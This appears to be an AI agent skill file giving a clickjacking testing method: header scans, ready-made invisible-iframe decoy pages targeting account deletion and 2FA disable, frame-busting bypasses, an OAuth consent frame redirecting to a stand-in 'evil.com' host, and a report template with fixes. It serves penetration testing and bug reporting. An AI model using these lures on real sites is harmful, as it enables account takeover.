---
name: clickjacking-hunter
description: Complete clickjacking (UI redressing) methodology — framing protection detection, single-click and multi-step PoC construction, JS frame-busting bypass, drag-and-drop and OAuth consent variants, and report structure. Use when checking whether a page can be framed for UI-redressing, building a clickjacking PoC, or testing X-Frame-Options / CSP frame-ancestors.
metadata:
  version: "1.0.0"
  author: AuditGuard
  tags: ["clickjacking", "ui-redressing", "web", "pentest", "poc"]
---

# Clickjacking Hunter

Clickjacking (UI redressing) tricks a victim into clicking elements on a hidden target page by overlaying invisible iframes on top of decoy content. Impact ranges from account deletion and fund transfer to OAuth authorization and 2FA disable — any one-click sensitive action is a candidate.

---

## Phase 1 — Check Framing Protections

### 1.1 Header check (fast)
```bash
curl -sI https://target.com/account/settings | grep -i "x-frame-options\|content-security-policy"
```

What you're looking for:

| Header | Value | Protection |
|---|---|---|
| `X-Frame-Options` | `DENY` | Blocks all framing |
| `X-Frame-Options` | `SAMEORIGIN` | Same origin only |
| `X-Frame-Options` | `ALLOW-FROM uri` | Deprecated, ignored by modern browsers |
| `X-Frame-Options` | missing | Vulnerable |
| `Content-Security-Policy` | `frame-ancestors 'none'` | Blocks all framing (supersedes XFO) |
| `Content-Security-Policy` | `frame-ancestors 'self'` | Same origin only |
| `Content-Security-Policy` | missing `frame-ancestors` | XFO governs, or no protection |

CSP `frame-ancestors` takes precedence over `X-Frame-Options` in modern browsers. Having only XFO is still accepted but weaker.

### 1.2 Scan multiple sensitive endpoints
```bash
for path in / /account/settings /account/delete /transfer /change-password /change-email /admin/dashboard /oauth/authorize /2fa/disable; do
  echo -n "$path: "
  h=$(curl -sI "https://target.com$path")
  xfo=$(echo "$h" | grep -i "x-frame-options" | tr -d '\r')
  csp=$(echo "$h" | grep -i "content-security-policy" | grep -o "frame-ancestors[^;]*" | tr -d '\r')
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "NO PROTECTION" || echo "${xfo} | ${csp}"
done
```

### 1.3 Check for JavaScript frame-busting
```bash
curl -s https://target.com/account/settings | grep -i "top.location\|window.top\|parent.frames\|top !== self"
```
If found → weak protection, bypassable with `sandbox` attribute (see Phase 4).

### 1.4 Automated scan
```bash
python scripts/clickjacking_agent.py https://target.com /account/settings /account/delete /transfer
```

---

## Phase 2 — Confirm Embedding

Before building a full PoC, confirm the page actually loads in an iframe:

```html
<!-- Save as /tmp/frame-test.html and serve with: python3 -m http.server 8888 -->
<html>
<body>
  <p>If the target loads below — vulnerable. If blank or console error — protected.</p>
  <iframe src="https://target.com/account/settings" width="900" height="700" style="border:2px solid red;"></iframe>
</body>
</html>
```

Open `http://localhost:8888/frame-test.html` in a browser where you're logged into the target. Check the browser console for `Refused to display` errors.

---

## Phase 3 — Build the PoC

### 3.1 Single-click PoC

Position the decoy button exactly over the target's sensitive button. Adjust `top`/`left` to align:

```html
<!DOCTYPE html>
<html>
<head>
<title>You've been selected!</title>
<style>
  #target-frame {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;   /* invisible */
    z-index: 2;
    border: none;
  }
  #decoy {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 1;
    background: #fff;
    text-align: center;
  }
  #bait {
    position: absolute;
    top: 350px;   /* align with target's sensitive button */
    left: 400px;
    padding: 15px 30px;
    background: #4CAF50;
    color: #fff;
    font-size: 18px;
    border: none;
    cursor: pointer;
    border-radius: 4px;
  }
  /* Opacity slider — for screenshot evidence set to 0.5 */
  #ctrl { position: fixed; bottom: 10px; left: 10px; z-index: 10; background: #333; color: #fff; padding: 8px; border-radius: 4px; }
</style>
</head>
<body>
  <div id="decoy">
    <h2 style="margin-top:120px;">Congratulations! You've been selected.</h2>
    <p>Click below to claim your reward.</p>
    <button id="bait">CLAIM REWARD</button>
  </div>
  <iframe id="target-frame" src="https://target.com/account/delete" scrolling="no"></iframe>
  <div id="ctrl">
    Opacity: <input type="range" min="0" max="100" value="0"
      oninput="document.getElementById('target-frame').style.opacity = this.value/100">
  </div>
</body>
</html>
```

Use the opacity slider to visually align the decoy button with the target button for the report screenshot.

### 3.2 Multi-step PoC

For actions requiring multiple clicks (e.g. Settings → Disable 2FA → Confirm):

```html
<!DOCTYPE html>
<html>
<head>
<title>Complete Survey</title>
<style>
  #target-frame {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;
    z-index: 2;
    border: none;
  }
  .step { display: none; text-align: center; margin-top: 180px; }
  .step.active { display: block; }
  .btn {
    position: absolute;
    padding: 14px 36px;
    font-size: 17px;
    background: #2196F3;
    color: #fff;
    border: none;
    cursor: pointer;
  }
</style>
</head>
<body>
  <!-- Step 1: aligns with "Settings" link -->
  <div class="step active" id="s1">
    <h2>Step 1 of 3: Pick your reward tier</h2>
    <button class="btn" style="top:200px; left:300px;" onclick="go(2)">Gold</button>
  </div>
  <!-- Step 2: aligns with "Disable 2FA" button -->
  <div class="step" id="s2">
    <h2>Step 2 of 3: Confirm selection</h2>
    <button class="btn" style="top:350px; left:400px;" onclick="go(3)">Confirm</button>
  </div>
  <!-- Step 3: aligns with confirmation dialog "Yes, disable" -->
  <div class="step" id="s3">
    <h2>Step 3 of 3: Claim reward!</h2>
    <button class="btn" style="top:400px; left:420px;">Claim Now</button>
  </div>

  <iframe id="target-frame" src="https://target.com/account/security"></iframe>

  <script>
    function go(n) {
      document.querySelector('.step.active').classList.remove('active');
      document.getElementById('s' + n).classList.add('active');
      // change iframe src if the action moves to a different page
      // document.getElementById('target-frame').src = 'https://target.com/...';
    }
  </script>
</body>
</html>
```

---

## Phase 4 — Frame-Busting Bypass

If JS frame-busting is detected (Phase 1.3), use these bypasses:

### sandbox attribute (most reliable)
```html
<!-- sandbox without allow-top-navigation blocks JS navigation attempts -->
<iframe src="https://target.com/settings"
  sandbox="allow-scripts allow-forms allow-same-origin"
  width="900" height="700">
</iframe>
```
`allow-top-navigation` is intentionally omitted — this prevents `top.location = ...` from working.

### Double-framing
If the target checks `top !== self` but not the grandparent:
```html
<!-- outer.html (your page) -->
<iframe src="middle.html"></iframe>

<!-- middle.html (intermediate page you control) -->
<iframe src="https://target.com/settings"></iframe>
```
The target sees `top !== self` is false relative to the middle frame.

### onbeforeunload interception
```html
<script>window.onbeforeunload = () => "";</script>
<iframe src="https://target.com/settings"></iframe>
```
Prevents the frame-busting redirect from completing in some browsers.

---

## Phase 5 — High-Value Targets

Always test these endpoints first — highest impact:

| Target | Attack | Potential impact |
|---|---|---|
| `/account/delete` | Single-click | Permanent account destruction |
| `/change-email` or `/change-password` | Single-click | Account takeover |
| `/2fa/disable` | Single or multi-step | Security downgrade → ATO |
| `/transfer` or `/checkout` | Single-click on pre-filled form | Financial loss |
| `/oauth/authorize` | Single-click | Attacker app authorized to victim's account |
| `/admin/*` | Single-click | Admin action performed as victim |
| `/settings/connected-apps` | Single-click | Malicious app authorized |

### OAuth consent clickjacking
The OAuth consent screen is a prime target — victim clicks "Authorize" without knowing it:
```html
<iframe src="https://target.com/oauth/authorize?client_id=ATTACKER_APP&response_type=code&redirect_uri=https://evil.com/steal&scope=read:all"></iframe>
```

### Drag-and-drop variant (no click required)
If the target has a drag-and-drop file upload or sortable element, trick the user into dragging instead of clicking:
```html
<!-- Invisible iframe covers the drop zone -->
<iframe src="https://target.com/upload" style="opacity:0.0001; position:absolute; z-index:2;"></iframe>
<!-- Decoy: "drag this file to the box below" -->
```

---

## Phase 6 — Automation

```bash
pip install requests

# Check headers + generate PoC for first vulnerable endpoint
python scripts/clickjacking_agent.py https://target.com /account/settings /account/delete /transfer /admin

# PoC saved to clickjacking_poc.html — open in browser while logged into target
python3 -m http.server 8888
# http://localhost:8888/clickjacking_poc.html
```

---

## Phase 7 — Report Structure

```
Title: Clickjacking on [endpoint] allows [account deletion / fund transfer / 2FA disable]

Severity: Medium — High depending on the sensitive action reachable

Affected endpoints: [list of vulnerable paths]

Steps to reproduce:
1. Log in to target.com as the victim
2. Open the PoC page (clickjacking_poc.html) in the same browser
3. Click the decoy button
4. Observe: [sensitive action performed on target.com]

Impact:
- [e.g. "Account deleted with a single click — no re-authentication required"]
- [e.g. "2FA disabled in two clicks — attacker can then take over account via credential stuffing"]

Evidence:
- Screenshot 1: PoC at opacity 0 — victim sees only decoy content
- Screenshot 2: PoC at opacity 0.5 — hidden iframe visible, button alignment confirmed
- Screenshot 3: Sensitive action completed on target after clicking decoy

Remediation:
- Add CSP: frame-ancestors 'none' to all pages (preferred — supersedes XFO)
- Add X-Frame-Options: DENY as fallback for legacy browsers
- Require re-authentication for irreversible actions (delete, transfer, email change)
- Add unpredictable CSRF tokens that expire quickly — limits iframe pre-fill window
- Set SameSite=Strict on session cookies — reduces session availability in cross-origin frames
```

---

## Quick Priority Order

1. **Account deletion / email change** — one click → ATO or permanent loss
2. **2FA disable** — security downgrade, enables ATO
3. **OAuth consent screens** — grants attacker app access to victim account
4. **Financial actions** (transfer, checkout) — direct financial impact
5. **Admin actions** — high impact if victim is an admin
6. **Settings changes** (notification prefs, connected apps) — lower severity
